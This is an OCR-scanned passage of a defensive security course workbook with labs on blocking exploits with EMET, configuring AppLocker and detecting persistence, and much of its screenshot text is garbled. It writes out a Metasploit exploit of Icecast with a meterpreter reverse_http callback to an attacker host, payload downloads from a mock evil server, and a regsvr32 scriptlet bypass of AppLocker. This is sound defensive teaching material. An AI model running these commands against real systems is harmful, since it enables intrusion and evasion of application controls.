VulnerableCode.exe has stopped working
A probtrm catK~ the p109r,1m to stop woMng c.orr«tfy. Windows 'Wtll e:kt1e tht program and notify you d, solubon 1s wail.t>le.

130

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-3.3: Exercise - Exploit mitigation using EMET & MalwareBytes
Objective

,...

The objective of the exercise is to analyze how exploits can be mitigated in using EMET &

MalwareBytes. We will also assess the risks of using EMET, as we will see how it can break

an unsupported application.

This rather large exercise will see a number of distinct techniques being used, including:

· As a first step, we will install a vulnerable software called "Icecast" to demonstrate an exploitable piece of software, we will also exploit it using Metasploit
· We will then install EMET and demonstrate how the attack is now blocked
Scenario Virtual Machines
1. SECS99-C01 - DomainController 2. SECS99-C01 - Windows 3. SECS99-C01 - Kali 4. SEC599-C01 - Firewall
SECS99-3.3
The objective of the exercise is to analyze how exploits can be mitigated by using antiexploitation software such as EMET.

1. Authenticate to Windows
Well, you must be tired of reading this, but start of by authenticating to the provided Windows machine:

USERNAME: Nick Fury PASSWORD: Awesomesauce123
2. Install Icecast
As a first step, we will install the Icecast vulnerable software. You can find it under your Desktop under "Vulnerable Software". We will install version 2.0.0 of the software.

Upon installation, you will be asked to provide Administrative credentials. You can use the following:

Username: .\student-localadmin Password: sec599

For the setup procedure you can just follow the default settings.

© 2017 Erik Van Buggenhout & Stephen Sims

131

·

,J.pplicallon loot, VU1nt11 le Softwa t

Shart Vocw

Mana9e

.,. · Vuln~·blt Soft...1re

M

>

v Cl Star h lnerab t Saft ..,e p

Quick access

B Desktop ,I, Oo..nk>ads

,I
,,

Documents Pictures

,t
,,

)' Mus,c

PrMl~e Escalabon
· Videos

Ila Ondlnvt

lhos PC

ct Neho,ork

User .Account Control

X

Do you want to allow this app from an unknown publisher to make changes to your device?

icecast2_win32_2.0.0_setup.exe
Publisher: Unknown File ongm: Downloaded from the Internet
· <;
To continue, enter an admin user name and password.

.,KB 19211'.fl

·

.\student-locala_d_m_in_ _ _ _ _ _ _-----.,

L·····~
Domatn: WINOOWS02

Yes

No

2 ,tems 11ttfTI selected I

3. Launching IceCast
Now, we will launch Icecast! You can do this by browsing to the "Program Files (x86)" folder where Icecast was installed and launching the icecast2.exe executable.

Hom·

Sharr

V1tw

f)

- 1'

" Looi D"k ((;J > Progr1m Ftlts ("86) , lceca<t2 Wanl2 ·

,P

J/t Quick ICCfSS

,,

· Desktop
.6, Downloads

,,

Documents ti

Pictures

ti

J Mus,c

PrMl~e Esalatoon
· Videos

I&, OneOnve
· ThosPC
· 0eslctop ...iJ Documents
,I, Downloads
J Mus,c - P,ctores

·m·
adm,n doc logs
wd,
L 1ctcart,xml ':~ keust2.oe l"i"' KtcHl2consok.e<e
tconv.dU ! l,bcuri,dll
libxmll.dll l!bxsll.dll
f!1 pthradVSE..dd
uninsOOO.dl1
t un1nsOOO.ece

D·t< modtfted
8fl2/2017a-07 AM &rl2/2017~ At.I S,12/2!W 2.-0"AM 8. t2/20r 211" AM 118/2004 8:25 AM 1 lll04 8:26AM 18/200!8:27AM 6.27/2002 711 PM 4 12/2003 9'29 PM 7 lm!Xl2 8:00 PM 7 10/2002 8:11 PM 3 2l/2002 M3 AM 8/12/20178.-07AM .i 14 200H.-OO AM

11p·

Si,:,

fde folder f,tefoldn rtt,foldu Fil· foldn XML Do<umt~t Applluton Applicaton Appbauon e..tms... ,!..pph.cat,on exttns..... Appltcation ,,,wu... Appl,catoon t.<tem Appliut,on e;."!ffl· DAT F,te Apphcalton

4KB 500IJI 243KB BS2 IJI 18HB 61Hll 12511! ~Ill
3KB 10KB

132

© 2017 Erik Van Buggenhout & Stephen Sims

4. Running the I ceCast server
Once Icecast is started, press the "Start server" button, after which the status should be come "Running" (in a green square).

s~.. v,...

9 1'

«

lc«ast2 'lemon 2.x

D X ca,t2 W,nl?

I'

it Quick access
a Desktop
... Downloads
Docummt.s
- Pictures
i Musi<

r r Stops...,.. I SAtpaprtliScaeteiovnerSotanrtup I I Serve, Status Scuce Level S\att
Global Statistics

S.:e

mt

4KB

500 Ill

Prov,tege Escal11t·
· Videos

Slat T

Name

Vaue

2-181:B

tns-

852KB

ms..

16H8

6 OMOm,e

ens-

6171:B

t'l lhosPC

......

Desktop

Documents

... Downloads

ms-
c,.tcns ·

1251.B SH'B 3 KB 70KB

J Music
... P,ctures
· V"tdeos

<

)

Sll'w,r He, Been R.....-.g 0 Oa,,s. 0 Heu1. 0 Mwei. 5 Secondt

5. Switch to Kali machine Let's switch to our Kali attacking machine and attack the IceCast service! We can authenticate to our Kali linux machine using the following credentials:
USERNAME: root PASSWORD: sec599
6. Disable Apache web server We would like to set up a Command & Control channel using HTTP over port 80. For that reason, we need to disable Apache, so it does not interfere with our exploit work.
First we need to open a terminal. Then type:
root@kali:~# service apache2 stop

© 2017 Erik Van Buggenhout & Stephen Sims

133

File Edit View Search Terminal Help

root@ka

7. Launch Metasploit console Let's open up a metasploit console. In the same terminal type the following command:
root@kali:"'# msfconsole
This should launch the Metasploit framework, as we did in some of the previous labs!

root(lkaU: ~ File Edit V~w Search TetmiMI Help

0 G) 0

8. Search for Icecast exploit module Metasploit allows us to search for any matching modules based on a software. We will now search for "icecast" and analyze the results! The command you can use is the following:
msf > search icecast
.....

134

© 2017 Erik Van Buggenhout & Stephen Sims

r

r

9. Select &amp; configure Icecast module
We can now select the right module using the following syntax:

msf > use exploit/windows/http/icecast_header

The options we need to configure are:

RHOST: 10.10.10.1 (this is the IP address of the firewall, which will forward connectivity to the vulnerable Windows machine, remember we are attacking from the "external" perspective)

We can do this using the following command:
msf exploit (icecast_header) > set RHOST 10.10.10.1

File Edit View Search Terminal Help

root@kali: -

o e o

10. Select &amp; configure Meterpreter payload

© 2017 Erik Van Buggenhout & Stephen Sims

135

Next we need to configure the icecast payload! In order to achieve this, we can enter the following commands:

msf exploit (icecast_header) > set payload windows/meterpreter/reverse_http msf exploit (icecast_header) > set LHOST 10.10.10.15 msf exploit (icecast_header) > set LPORT 80

Explanation: We want the payload to be a meterpreter and we want it to connect back to our attacking machine over HTTP using port 80.

File Edit View Search Terminal Help

root@kaU: ·

oe o

11. Exploit Icecast! Once all settings are correctly configured, we can now launch the exploit:
msf exploit(icecast_header) > exploit
We can confirm successful exploitation by running "sysinfo" in the meterpreter:
meterpreter > sysinfo
If you feel like, please feel free to play around with your meterpreter a little (after
all, it's fun :p). Don't lose too much time however, we need to move forward and start looking at how we can now prevent the exploit from succeeding.

136

© 2017 Erik Van Buggenhout & Stephen Sims

! i 1 t t _·-~ HI: p I,. ;1·1. t· ,. l' ,-1 · ·.

t T!

I ·.,c._,;i, · !

!'+ ll :l· !'

',1 ·, l .·

; 1~· l .·, .. _)

,'1 ' ~. \) ,'

.. :,,. u·
-··· ~ ·; ~· ~· - I
12. Close meterpreter session
Once you are done exploiting, please exit the meterpreter session:
meterpreter > exit
13. Install EMET on Windows02
Let's switch back to our Windows machine and install EMET! You can find the EMET installer on the Day3 ISO DVD! For proper installation of EMET, we need to login with administrator credentials.
So let's sign out of your nick.fury account (or use "switch account" in Windows), and use the following credentials to logon:
,-.
USERNAME: .\student-localadmin PASSWORD: sec599
Then install EMET, the EMET setup is rather straightforward, you can just "click" through it! When prompted, select the "Recommended" settings for EMET!
If you would have installed EMET by elevating to the local admin account from your nick.fury account, you would not be able to run the EMET GUI (which will be essential for further configuration).

© 2017 Erik Van Buggenhout & Stephen Sims

137

X
~ EMET Configuration Wizard

· Use R~nded Settings

· Reset existno appkabon can~abon se!ttrlOS

· Add protections for lntm1et Explore,, W0tr$>ad, Microsoft Office, Adobe Aaobllt and Reader, ond Oracle lll·ll

· Add Cerbfo~ Trust rues for Microsoft and olher P01)1A1r 0th -

(Twitter. F ~ and Yahoo')

· Enable Repcrq 1tYough WndoM Event loO, Trcty lean. and Ealy Wanno Prog-am

Confioure Manualy Litter

14. Open EMET GUI Now open the EMET GUI by right-clicking the EMET icon in the system tray and selecting "Open EMET".
OpenEMET Hide

15. Opening EMET Apps menu
In order to protect our vulnerable application (IceCast), we will need to add it as a "to-be-protected" application in EMET. We can do this by first clicking the "Apps" icon at the top of the EMET GUI. The "Apps" window will give you an overview of already configured applications and the protection measures that have been enabled for each of them!

138

© 2017 Erik Van Buggenhout & Stephen Sims

@ "

EmMced MitiQa!ICl'I ~ Toot.!t

... X

,,....
---
,,...

llrc>ort
Export
I , Gro.c> Pol,cy Wizard

.
Apps

~
Trust

Qudc Profile Name:
"J Custom ~ t y Sf!tmgs 1

Skin. Office 2013

.., ,\ndows EH!ntlog .., Tray Icon .., Early Wamng

~
~ .

FJe

Configu-abon

Systen 5et1ngS

Reportr,g

Info r.

16. Add Application
Now click the "Add Application" button.
Browse to the icecast appl ication folder ("C:\Program Files (x86)\Icecast2 Win32") and add file icecast2.exe.

Export Export Selected
File

Add Application Add \f\./fldcard Remove Selected
Add / Remove

17. Check EMET configuration Check that icecast2.exe appears in the list of applications to be protected by EMET. By default, it should be added to the bottom of the list and most of the protection measures should be enabled.
Make sure to click OK to accept the changes.

© 2017 Erik Van Buggenhout & Stephen Sims

139

..

- -~-. --- - _., 4 0
E-.1
seec....

)(
~

~-eo,,·~

et:, ~""

_,,_ 9-FJ

9-c;,...,

1>8ll\ ~o,gs

· Sll>Oone><llbt A\jOtony

""'
"'"OI"""'
~ · Aile>"""" OUTLOOK.[)([ W IHWORO.EXl ocaUXI l'OWERJ'IIT.lX[ """'ClSSJ:JI( HSPUIUXt: UlfOPATH.Ol[ VISJO.En Vl'REVIEW.LXI: LYIIC.00 PPTVIEW.EXl OIS.EXE Acrolld32.exe Actob.Lvte )llva.exe,avnr.exe: )llva:~e lt:ecasU.ext

Add / R -
OEP.,, .,, .,,
.,
.,, .,, .,, .,, .,, .,, ., ., .,, .,, .,, ., ...,,,,
..,,

.,,

· '.P,,.

--°"'°"'

Clear

.,,

., .,,

fN·

Otl&i\ol<tlon
"" .,, .,,tlot .,,

.,, .,, .,, .,

.,, .,, .,

., .,, .,, .,,

.,, ., .,,

., .,, ., .,,

.,, ., .,

.,, .,, .,, .,,

.,, .,, .,,

.,, .,, .,, .,,

.,, ., .,,

., .,, .,, .,,

., .,, .,,

.,, .,,

.,, .,,

.,, .,,

..,,,,

.,, .,,

..,,,,

., .,,

.,, .,, .,, .,,

.,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,,

.,, .,, .,, .,, .,, .,, .,, .,,

.,, .,, .,, .,, .,, .,, .,, .,,

.,, .,,

.,

.,, .,, .,,

.,, ..,, .,, ..,,

..,,,,

., ..,, ., .,, ..,, .,

.,, .,, .,, .,,

.,, .,, .,,

 0...0-  MIIO.bn
.., 8ar'rttc 1-.f'W""ll'Wllf '-\t.,)a- Set1ro(ls

-.,, .,, "".,', .,,,:ac,.

.,, .,, .,, .,,

., .,, .,, .,,

.,, .,, .,, .,

.,, .,, .,, .,,

.,, .,, ., .,,

.,, .,, .,, .,,

.,, .,, ., .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, .,, .,, .,,

.,, ., .,, .,,

.,, .,, ..,, ..,,

.,, .,,

.,, .,,

..,,,,

.,, .,,

-- ... X
·'ill f«-.:S
.,, .,, .,

18. Sign out and log in as nick.fury
Now you can sign out as local administrator and sign in again with your Nick Fury account:
Username: nick.fury Password: Awesomesauce123
Alternatively, if you used the "switch account" function in Windows 10, let's switch back to our Nick Fury account.
19. Restart Icecast If Icecast is still running, please click "Stop Server" and close the application
window.
Run icecast again and click the "Start Server" button again.

140

<el 2017 Erik Van Buggenhout & Stephen Sims

8 ~ cu
M1111i"'\Miil Home Share View
, This PC Looi D1slc (C:}

Program Files (x86} > lcec,st2 Winl2

t Quick access

· Desktop
,I, Downloads
Documents

" " "

... Pictures
ru::

"

J, Music

Pnvllege Escalation

· VidN>S

4a OneOm,e

C1 This PC

Networlc

Ntu·"'e

Type

admrn

9/7/2017 7;S7 PM File folder

doc

lcecast2 Version 2.Jl

logs

File

web

About

· 1cecubml

',! lcecast2.exe
'i"' icecastlconso

Ir Stop Server

Start Server on

· ~St~

iconv.dll

l I Servet Status S01.1ce Level Sta

libcur1.dll libxml2.dll

Global Statistics

hb,..lt.dll pthreadVSE.dll umnsOOO.dal

Stat T

Name

' - un1nsOOO.ece

0 X

C

>

Se,ve1HMBeenRIM'ri-,g 0 Dey, 0 H01.1s. 0 Mroutes, 11 Seconds

20. Exploit again Repeat the previous steps: Attempt the same exploit (with the same settings we used in tasks 7, 8, 9, 10 and 11).
Can you confirm what is happening now? The Metasploit exploit should now fail, resulting in the following situation:
o The Icecast server application crashes and a Windows error is returned; o The Metasploit exploit fails and no "Meterpreter" session is returned. We have successfully prevented a vulnerable third-party application from being exploited!

© 2017 Erik Van Buggenhout & Stephen Sims

141

~ lcecast2 in MFC Apphcat,on

X

lcecast2win ~A FC Application has stopped working
A problem caused the program to stop working correctly. Windows will close the program and notify you if a solution is available.

I I Debug

Close program

~-~-~--~

.....

142

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-3.4: Exercise - Configuring Applocker
Objective
During this exercise, we will deploy a configuration for Applocker that can be used to stop a malicious payload from executing. We will configure the Applocker policy on the AD-level (domain) and push it through our clients using group policies.
The exercise consists of the following high-level steps:
· Define the Applocker application whitelisting configuration on domain-level · Push the configuration towards clients using group policies · Attempt to execute our malicious payloads to now see effective blocking of payloads · Illustrating an application whitelisting bypass technique
Scenario Virtual Machines
1. SEC599-C01 - Windows 2. SEC599-C01 - DomainController 3. SEC599-C01 - Firewall 4. SEC599-C01 - Kali
Exercise 1 : SEC599-3.4
During this exercise, we will deploy a configuration for Applocker that can be used to stop a malicious payload from executing. We will configure the Applocker policy on the AD-level (domain) and push it through our clients using group policies.
The exercise consists of the following high-level steps:
· Define the Applocker application whitelisting configuration on domain-level · Push the configuration towards clients using group policies · Attempt to execute our malicious payloads to now see effective blocking of payloads · Illustrating an application whitelisting bypass technique

1. Logon to the Windows workstation As we've done several times through the different labs. We will log on to the Windows workstation with our default user:
Username: nick.fury Password: Awesomesauce123
2. Executing unwanted applications In this first step, we will show that unwanted applications can be executed on our machines.

© 2017 Erik Van Buggenhout & Stephen Sims

143

Go to URL http://www.evilwebserver.com/samples (also added as a favorite in the Chrome browser), and download the payload.exe, payload.di!, payload.vbs and payload.hta files to your download folder. It's a good idea to use Internet Explorer instead of Chrome, as Chrome's built in mechanism will block the download of these files. You can launch Internet Explorer by typing "iexplore" in the Windows search bar (opened by the Start button). Once downloaded, we can execute payload.exe, payload.vbs and payload.hta (accept the warnings). For payload.hta, use Microsoft (R) HTML Application host. The programs will execute, although you will have not have visua l confirmation of this (they are actual malicious payloads that attempt to connect back to an attacker machine in the background).
How do you want to open this file?
Keep using this app
· i i Microsoft (R) HTML Application host
Other options
Microsoft Visual Studio 2017
look for an app in the Store
More apps ,
D Always use this app to open .hta files
OK

144

© 2017 Erik Van Buggenhout & Stephen Sims

3. Logon to the domain controller
Now, let's try preventing the execution of such files. As we want to tackle this from an enterprise perspective, we will logon to the domain controller (switch machine) with our domain admin credentials:

Username: Administrator Password: Sec599

4. Launch the GPO editor From the Server Managar dashboard, go into the Tools menu and launch Group Policy Management.

f... SetverManagei
·· Dashboard

.. (-._Z___ )

ui Dashboard

WELCOME TO SERVER MANAGER

£ DNS
ii File and Storage SeN1ces ~

8 Config
2 Add r 3 Addo

4 Creat
5 Conn

LEARN MORE

ROLES ANO SERVER GROUPS

-

D X

Acbw Directory Oomains a.nd Tru.ts ActM, DirectOty Module for Window> PowefSlu,ll Acuve O,=tory Sites and S..rvices Active o,rrcto,y Users and Computt,B AOSIEdrt Componwl S..MCes Computer Management DeftagmN11 and Optim,u Dnves Dtsi<Cleanup
DNS
Ewntv...,,.,
Group Policy Manag<,ment ,SCSI Initiator Local Secvoty l'ohcy Microsoft Azure S..rvices OOBC Oota Sources (32-b,tJ OOBC Data Sources (64-bll)

5. Select the Default Domain Policy Drill down in the tree view of the Group Policy Management application: Forest: synctechlabs.com - > Domains-> synchtechlabs.com -> Default Domain Policy
Right-click and select Edit. ..

·.--..

© 2017 Erik Van Buggenhout & Stephen Sims

145

Group Policy Management Action View Window Help

: C

- Group Policy Management Default Domain Policy

V

Forest: synctechlabs.com Scope DetaUs Settings Oeleg

V · Domains
··s V synctechlabs.com

Unks

Default Dom~in Display links in this location:

,-..-.,.-- ~ -

----~-

Domain C - - -Ed-it.-.. ~ - - - - - - ~ - - -

> Group Pol

Enforced

> =7 WMI Filter

Link Enabled

> = Starter GP1

)

Sites

Save Report...

Group Policy Moc

View

>

Group Policy Re.sl

New Window from Here

6. Enable Application Identity service In the Group Policy Management editor, drill down to:
Default Domain Policy-> Computer Configuration-> Policies-> Windows Settings -> Security Settings-> System Services
Select the Application Identity service. Open its properties, and enable the setting to Automatic. This will start the Application Identity service automatically, this service is a prerequisite for Applocker.

146

© 2017 Erik Van Buggenhout & Stephen Sims

J - . n.,r !

- rtor

File Action View Help

.. .. !I

I .J Default Domain Policy (DC.S " Service Name ,...

v -,!w Computer Configuration
v J Policies
-l Software Settings
Windows Sgting,
> .J Name Resolut
.._. Scripts (Startu
!!!I'll Deployed Prm
Ji v Securrty Settir
,3 AccountP > j local Polic > j Eventlog > ....t Restricted > Systan Se
> 4 Registry > .J File Systen
J > Wired Net
> Windows I

b Active Directo,y Domain ... D Active Directory Web Serv...
Q Active){ Installer (AldnstSV)
0 AIUoyn Router Setvice 0 App Readiness
Q Application Identity
i)Appfication Information
1 § Application layer Gatt!Wa..,
ri')Appl,cation Management
'Ii)AppX Deployment Service...
@ Auto Time Zone Updater
D Background Intelligent Tr... U Background Tasks lnfrastr... 0 Bue Filtering Engine D Bluetooth Support Setvice D CDPUsesSvc_47d12c 0 Certificate Propagation

i )Client licenseSeMce (CIL.. f) CNG Keylsotat,on

Application Identity Properties
E2l Deline tlis policy settng
Select seMCe startup mode: @i\.tomatJc Q Marual
o~
OK

C' X X

7. Configure Applocker - step 1 So now let's start configuring Applocker: Under Security Settings, drill down to Application Control Policies-> Applocker Click on "Configure rule enforcement". We will enable the checkbox for "Executable rules" and "Script rules".

© 2017 Erik Van Buggenhout & Stephen Sims

147

Applodw Propetties

X

~ Computer Conf19urahon,.,
v Policies

Applocker provides access co1

Software Settmg,

v Windows Setting:

G~ng Started

V

Name Resolut

..., Scripts (Startu !el Deployed Prin
il v Security Sett1r

,Wlockeruses nJes .id the l)R)l)e(lies d
rues rues a,ppic,,l,ons. I nJes are p,esen n a nAe
wil bepemjtted to "" ,Wlocker

,J Account P

> j local Poh,

CJ 'olore abocA ,J,ppL.ock..-

> j Event log > Restncted

a 'l,'rvd', edulns o! WnoomaJPl)OII 1'o

> System Se > 4 Registry

Configure Rule Enforcement

) -4 File Systen
> ~· WuedNet > Windows I
Network l
) Wireless N
> Pubhc Key

I
Use the erio,cemert setmgs for e""'1 nAe erictt:ed or audied. f nAe eriorcemert has bydefd

Software~

v Apphcatio

-i,i Applo

> 4i, IP Secunty "

<

)

OK

8. Configure Applocker - step 2
Now that we've configured Applocker to use Executable & Script rules, we still need to add rules of course! Luckily, Applocker can be configured to automatically create a set of default rules. We can do this as following:
o Drill down to Executable Rules, right click, and select Create Default Rules. o Do the same for Script rules.
This will create the default rules essential for the operation of our Windows computers.

148

© 2017 Erik Van Buggenhout & Stephen Sims

Application Control Policies

Applocker

> Execut~hlP Rul,-c; _ _

)

Wind<

Create New Rule...

> Script

Automatically Generate Rules...

> Packa

Create Default Rules

-----~

IP Security Pc -------~-~ -- --~ - - - - - - ~

9. Configure Applocker - step 3 Now we will add a custom rule, to prevent users from execut ing executables and scripts from their user directories (which is a common location for the downloads of malicious payloads).
Right-click on "Executable rules", and select "Create New Rule..."
In this wizard, do the following: 1. "Before You Begin": click Next 2. "Permissions": Select Deny and click Next 3. "Conditions": Select Path and click Next 4. "Path": Click Browse Folders... and select folder c:\users, click OK, click Next 5. "Exceptions": click Next 6. "Name": click Create
You have now created an Applocker rule to deny t he execution of all applications (.exe) in the C:\users folders and subfolders.
Do the same for Script Rules: Right-click on "Script rules", and select "Create New Rule..." Following the same procedure as above, create a new script rule to Deny execution of scripts in the C:\users fodler.

© 2017 Erik Van Buggenhout & Stephen Sims

149

Path
Before You Begin Perm1ss1ons Conditions
Path Exceptions Name

Select the file or folde.r path that this rule should affect. If you specify a folde.r path, all files unde.rneath that pat h will be. affected by the rule.

Path;

Browse Files... Browse For Folder

7 Browse Folders...

I Select a f'0lder contanlg the neassary fies.

·> Vide.os

"

~ Floppy Disk Drrve. (A:)

v _ Local Disk (C:)

Pe.rflogs
> Program Ftll!S

Program Ftll!S (x86)
..., Users

Administrator

) Public

"'

More about path rul

10. Switch back to the workstation Now return to the Windows workstation, and go back to the desktop of user Nick.fury.
11. Check application of group policies First we will check if the group policies have been applied to our workstation.
Launch the event viewer (eventvwr, View event logs), and drill down to:
Applications and Services Logs -> Microsoft -> Windows-> AppLocker -> EXE and DLL
If you don't see any events, the GPO have not been applied yet. In that case, open a command line and launch the command "gpupdate /force", this will force the appication of the new GPOs.
After some time, you will see an event 8001 (you will need to refresh the view). This event indicates that the GPOs have been deployed and the AppLocker is running.

150

© 2017 Erik Van Buggenhout & Stephen Sims

r. v Appfic·tioos and SeMccs Ai FXE and ot I Numb" or ., enlJ: 1

Actions

i;'j HordwueEvents

.-;;;;;;;;;;;;:;;;;;:;;;;;;;;;;;;;;:;;;;;:;;;;;:;;;;=:;;;:;;;;=:;;=:;;=:;;~

t;'l lntom<I &plam

L...,.,

O.te ·nd Time

Source Event ID EX[ ·nd Ol l

... ...

J:1 Kry Monog,m·nt Seo
v .J Mi<rosott

,.) Open Saved Log··.
T c,eate CustomVi,e,.·

_. AppV _. lker Expulcnce Vi V Wi.ndOWS
AAO
..J AlHJser·lnrtal
AIUoyn
AppHort ApplO

Import Custom Vie-._
Clu,Log...
f' Filt.., C..rrnrt Log.·
J PropertJos
0iS>ble Log
SQ fllld...

Apphubihty£r

Apphut1on Se

Appti<otaon-&
.J Apphcotionl\e

v

nApplocker EXE,ndm

0 MSI end Sc

C================> Id S.v,All EventsAs.·.

Event 8001. Applocktr

)(

Attach i1 Tuklo tht.-

Gene,..1 Oet.il,
, he Awlockor policy '"' app6ed successfully to tl,15 compu

12. Try to execute unwanted applications
Go back to the download folder, and try to execute payload.exe and payload.vbs. This will be blocked, because we have configured AppLocker for both executables and scripts.

payload.hta will however still execute. AppLocker does not block scripts inside HTA files, and this is one way to bypass AppLocker script control. Tip: to block HTA applications, create an AppLocker rule to block MSHTA.EXE, this is the host for HTA files.

C:\Users\nidc.fury\Downloads\payload.exe

X

~ Your system administrator has blocked this program. For more information, contact your
~ system administrator.

OK

13. Blocking unwanted DLLs
The application rules we created now only apply to executables that are loaded into a new process (like .exe, .scr, ...), they do not apply to executables that are loaded into existing process (libraries: .dll).

We can block DLLs too, but that requires extra configuration, so let's go back to the domain controller.

In the GPO editor, under AppLocker -> Properties, select the Advanced tab. This tab

explains that DLLs are not policied by default. This can be enabled, but can impact

system performance.

© 2017 Erik Van Buggenhout & Stephen Sims

151

Enable the DLL rule collection. This will create a container for a new set of rules: DLL Rules. Like we did with Executable rules, proceed to create the default rules and a deny rule to block DLLs in C:\users. We can do this as following:
o Drill down to DLL Rules, right click, and select Create Default Rules.
This will create the default rules essential for the operation of our Windows computers. Finally, we will add a rule by right-clicking on "DLL rules", and select "Create New Rule..."
In this wizard, do the following:
1. "Before You Begin": click Next 2. "Permissions": Select Deny and click Next 3. "Conditions": Select Path and click Next 4. "Path": Click Browse Folders... and select folder c:\users, click OK, click Next 5. "Exceptions" : click Next 6. "Name": click Create
You have now created an Applocker rule to deny the execution of all dll1s in the C:\users folders and subfolders.

Apploclrer Properties

X

File Action Vi..w Help

· · -l I
ame ResolLSbon Policy knpls (Startup/Shutdown)

I"' ~ Applocker provides access co,

eployed Pnnters

iecurity Settings
j Account Policies j Local Policies j EYfflt log

4 Rmncted Groups
,a SystM"I SeMces -41 Registry
4, File System
Ji/ Wirl!d Network (IEEE 802.3) Pc

CJ More aboo.t >!,plocl-:eCJ Y.tdleoroosal W ~ SlJPP(lft

Windows Firewall wrth AMn
.] Network list Manager Policie:
'J Wi~ess Network (IEEE 802.11
Public Key Policies
.J Software Restnction Policies
:::l Application Control Polictes v .j Applocker

Configure Rule Enforcement
I Forthe /wlockerpolicylo beerl ldet-ily service rruot be n.wn'lg.
J l.he the eri0101!ffl!!ff lldlr,gsforead, tUle
enorcedoraudited · rue ertoroemen has ni
t,ydefu

~ Executable Rules
t"=" Window. Installer Rul·
; J Script Rules
j~ a Packaged app Rules IP Security Policies on Activ~ I .,

"'° l!:S ,r{9U"' erlorcemert
CJ ·~ aboli rue erlorcem~
-~ Overview ---------1

1 DLL nAes can affect _,__ l)elf-.ce
()o,!y enable OllllAes all..-lhorougt,lyrew,w,ng the fwl.ocke,
docunerollcn. OLL rue, ca, llifea ,y,tem perionnance and ca,se ~ e d behaYIDI' i they are not pmpe,fy 1'11)1emerted
62J Enable lhe DLL rue oo1ec:t!on

OK

Ca'ICel

152

© 2017 Erik Van Buggenhout & Stephen Sims

14. Switch back to the workstation Now return to the workstation, and go back to the desktop of user Nick.fury.

Wait for the new GPOs to be applied (monitor the event viewer, like we did before, refreshing the view). If this takes too long, you can force it with the command "gpupdate /force".

Once the new rules are enforced, you will see events reporting that "....dll was allowed to run" (remember to refresh the event viewer).

,,...._

EventV,,:,,,er

D X

,,...._

v,_ Help

· I fJ

---

..., n Appliations and Savices,.
f.l Hardware Events IJ Internet Explorer

EXE .nd Oil level

Number cf events: 25
Dale and Time

Source

Event II "

Ac1ioM EX£ and OU

.. ,.

---

(;l Key M.,nagement Sef"
v - Mter~oft

\!) lnformabon 9/5/20178:19-.49 AM

Applo...

· Open Saved log...

800.

Cre.i:e Custom Vie.··

,,.....

_, AppV User Experience Vi

:I)lnformabon 9/5/20178:19:49 AM (D lnformabon 9/5/2017 8:19:49 AM

Applo...

800

Applo...

800

Import Curtom Vie...

..., Windows

(D lnformabon 9./5/2017 8:19:49 AM

Applo...

800

Clurlog...

AAO

"1) lnfonnabon 9/5/2017 8:19:49AM

Applo...

800

.-, filter Current log...

,,.....

> All-lker-lnstal > AIUoyn

· lnformabon 915/2017 8:19:49 AM !}lnformabon 9/5/2017 8:19:49 AM

Applo... Applo...

800

I Propert,es

800

> .J AppHost

(D lnformabon 9/5/2017 8:19:49 AM

Applo·..

800

Disable l og

> ApplO

:I)lnformabon 9/5/2017 8:19:49 AM

Applo...

80() V Ql9 Find...

)

ApphcabtlityEr

<

> Application Se

>

IJ Save All Events As·.·

> Apphcat1on-E,

Event 8002., Applocker

)(

Attach a Task To th1...

..J ApphcationRe

V

Applocktt

General Details

·

EXE and Dl

r,SYSTIM_32_"_~0-SR_Ol_E.-Dl_l_w_,sa__llow_ed_t_o_ru_n.---- ,.

Refresh

--

MSI and Sc
1 Packaged 1

6 Help

·

I Packaged I

.ogName

Microsoft-Windows-Applocker/EXE and Ol v

Evtnt 8002. Applocker ·

> AppMOMI-Ru V

<

<

>

>

Event Properties

~ Att11rh T11<~ Tn Tht<-

..,

15. Executing unwanted Dlls To execute our unwanted DLL payload.di! we will open a command prompt and browse to the Downloads folder. Once in the Downloads folder (this is a requirement, otherwise the .dll will not be loaded), we can execute the following command:
rundll32 payload.dll, # 1
You will see a warning that this was prevented. There will also be an error event in the Appl ocker event viewer reporting that the payload.di! was prevented from executing. We have now successfully blocked a malicious .dll for loading!

© 2017 Erik Van Buggenhout & Stephen Sims

153

RunDLL

X

There was a problem starting payload.di!
This program as blocked by group policy. For more information, contact your system admimstrator.

If...............oK..··~··..·····11

.

.... .. .. .... ,,._,

16. Bypassing script control
Although a highly effective control, Applocker's execution of scripts can be bypassed! Security researchers are continuously looking for new effective techniques to prevent payload execution. One such researcher goes by the handle of "SubTee" (Casey Smith).
In this last exercise, we will illustrate one such example: we will execute a script by using a scriptlet and regsvr32.exe. From www.evilwebser.com/samples, download file payload.set to your downloads folder.
Right-click the downloaded file payload.set, and select unregister. This will execute a ]Script that launches cmd.exe (our payload was designed to run cmd.exe).
You will see an error message. In order to make the attack a bit more stealthy, adversaries could opt to supress the error message by launching the scriptlet from the command-line with regsvr32:
regsvr32 /u /n /s / i: payload.sc scrobj .dll
As a small additional note: the "/i" parameter can also include a URI parameter (thus a scriptlet that is hosted on a remote web site).
Although this is not an offensive course, we want to illustrate how Applocker rules can be bypassed, again illustrating the need for defense-in-depth and not overly relying on one single control.

154

© 2017 Erik Van Buggenhout & Stephen Sims

,,.

payload.set

rv1

.,...._

Open

,-.
Generate Type Library

,-.

Register

......
Unregister
,,.....

,,...

© 2017 Erik Van Buggenhout & Stephen Sims

155

This page intentionally left blank.

156

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-4.1: Exercise - Catching persistence using Autoruns
Objective

The objective of the lab is to detect a number of persistence strategies implemented on one of our Windows machines! Throughout the exercise, you will complete the following high-level steps:

· Run autoruns & Malwarebytes Anti-Rootkit on our Windows workstation · Analyze the output & identify the malicious persistence mechanism · Use GPO's and scripts to run autoruns periodically on all domain hosts · Optional: Dashboard the autoruns output in ELK stack for baselining
Scenario Virtual Machines
1. SEC599-C01 - Windows 2. SEC599-C01 - Firewall 3. SEC599-C01 - Kali 4. SEC599-C01 - DomainController
Exercise 1 : SEC599-4.1
The objective of the lab is to detect a number of persistence strategies implemented on one of our Windows machines! Throughout the exercise, you will complete the following high-level steps:

· Run autoruns & Malwarebytes Anti-Rootkit on our Windows workstation

-..

· Analyze the output & identify the malicious persistence mechanism

